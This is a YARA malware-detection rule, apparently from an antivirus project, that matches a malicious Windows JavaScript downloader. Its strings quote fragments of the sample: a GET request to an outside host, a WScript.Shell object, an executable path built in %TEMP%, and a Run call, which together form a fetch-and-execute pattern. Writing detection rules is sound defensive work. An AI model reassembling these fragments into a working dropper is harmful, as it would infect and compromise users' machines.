rule sig_20160330_75b580c69ad10e4ea5c0d6d2406bc813 {
  meta:
    description = "datamaliciousorder - file 20160330_75b580c69ad10e4ea5c0d6d2406bc813.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bfbd92eab54be4917bce0433a072e426b961d8b5a4760cc3adb5484617653466"

  strings:
    $s1  = "HF[U](\"GET\", \"http://vidamparty.hu/as0ldr\", false);" fullword ascii
    $s2  = "function V(J, Z1){C = C * 1; return J - Z1;};" fullword ascii
    $s3  = "var A = function T() {return WScript[Q](\"WScript\"+\".Shell\");}(), T0 = 11;" fullword ascii
    $s4  = "if (HF[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function I(){return K0 + \"\";};" fullword ascii
    $s6  = "function BG() {return A[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"KsnfGu5w5.ex\" + \"e\";};" fullword ascii
    $s7  = "function Z() {return ((XT == true) && (XT == MT)) ? 1 : C;};" fullword ascii
    $s8  = "function MZ(B){A[\"Run\"](B, C, C);};" fullword ascii
    $s9  = "var R = new this[\"Date\"]();" fullword ascii
    $s10 = "function S(){return 22;};" fullword ascii
    $s11 = "function SD(){return Q;};" fullword ascii
    $s12 = "return V(NL, UM);" fullword ascii
    $s13 = "}while (XO);" fullword ascii
    $s14 = "function YX(G) {var K = (1, 2, 3, 4, 5, G); return K;};" fullword ascii
    $s15 = "var L = false;" fullword ascii
    $s16 = "var MT = false;" fullword ascii
    $s17 = "MT = true; " fullword ascii
    $s18 = "XT = true; " fullword ascii
    $s19 = "var XT = false;" fullword ascii
    $s20 = "} catch(ZU){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}